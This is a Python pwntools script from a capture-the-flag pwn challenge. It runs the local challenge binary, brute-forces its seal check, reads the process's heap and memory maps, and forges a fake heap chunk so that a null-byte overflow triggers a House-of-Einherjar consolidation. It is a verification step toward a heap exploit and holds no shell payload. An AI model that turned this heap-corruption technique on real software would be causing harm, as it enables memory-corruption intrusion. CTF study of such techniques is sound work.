#!/usr/bin/env python3
"""Local: confirm House-of-Einherjar free via COMPACT null byte."""
from pwn import *

context.arch = "amd64"
context.log_level = "info"

WORK = "/home/sira/Documents/CTF/Lancang_Mekong_CTF_comp/solved/pwn_the_last_flush/work"
LD = f"{WORK}/ld-linux-x86-64.so.2"
BIN = f"{WORK}/chal"

# Measured from dump_heap.py with the same alloc order (no OPEN_SUMMARY).
OFF_A_CHUNK = 0x3290
OFF_A_USER = 0x32A0


def menu(p):
    p.recvuntil(b"archive> ")


def seal(p):
    lo, hi = 0, (1 << 64) - 1
    while lo <= hi:
        mid = (lo + hi) // 2
        menu(p)
        p.sendline(f"SEAL {mid:016x}".encode())
        line = p.recvline()
        if line.startswith(b"sealed"):
            return
        if line.startswith(b"higher"):
            lo = mid + 1
        else:
            hi = mid - 1
    raise SystemExit("seal fail")


def cmd(p, s):
    menu(p)
    p.sendline(s.encode() if isinstance(s, str) else s)
    line = p.recvline().strip()
    log.info("%s", line)
    return line


def main():
    p = process([LD, "--library-path", WORK, BIN])
    seal(p)
    maps = open(f"/proc/{p.pid}/maps").read().splitlines()
    heap = int(next(l for l in maps if "[heap]" in l).split("-")[0], 16)
    user = heap + OFF_A_USER
    chunk = heap + OFF_A_CHUNK
    log.info("heap %#x A user %#x chunk %#x", heap, user, chunk)

    A = bytearray(b"A" * 0x258)
    A[0:8] = p64(chunk)
    A[8:16] = p64(chunk)
    A[0x250:0x258] = p64(0x260)
    cmd(p, f"STORE 600 {A.hex()}")  # 0x258 = 600
    cmd(p, f"STORE 1272 {'42'*0x4f8}")  # B
    cmd(p, f"STORE 600 {'43'*0x258}")  # guard

    # verify offsets before compact
    mem = open(f"/proc/{p.pid}/mem", "rb")
    mem.seek(chunk)
    hdr = mem.read(16)
    log.info("A hdr %s", hdr.hex())
    mem.seek(chunk + 0x260)
    bhdr = mem.read(16)
    log.info("B hdr before %s", bhdr.hex())

    cmd(p, "COMPACT 0")
    maps = open(f"/proc/{p.pid}/maps").read().splitlines()
    pie = None
    for line in maps:
        if "/chal" in line:
            pie = int(line.split("-")[0], 16)
            break
    mem.seek(pie + 0x5060)
    rec = u64(mem.read(8))
    log.info("record0 %#x (expected user %#x)", rec, user)
    mem.seek(rec + 0x248)
    log.info("bytes at rec+0x248 %s", mem.read(32).hex())
    mem.seek(chunk + 0x260)
    bhdr = mem.read(16)
    log.info("B hdr after compact %s", bhdr.hex())

    menu(p)
    p.sendline(b"DROP 1")
    line = p.recvline(timeout=2) or b""
    log.info("drop B -> %s", line)
    if p.poll() is not None:
        log.error("died rc %s", p.poll())
        print(p.recvall(timeout=1))
        return

    mem.seek(chunk)
    hdr = mem.read(32)
    log.info("A hdr after drop B %s", hdr.hex())
    # parse a few chunks from A
    mem.seek(heap)
    blob = mem.read(0x8000)
    off = OFF_A_CHUNK
    for _ in range(6):
        prev = u64(blob[off:off+8])
        sz = u64(blob[off+8:off+16])
        size = sz & ~7
        log.info("chunk heap+%#x size %#x flags %d prev %#x", off, size, sz & 7, prev)
        if size < 0x20 or size > 0x8000:
            break
        off += size
    p.close()


if __name__ == "__main__":
    main()
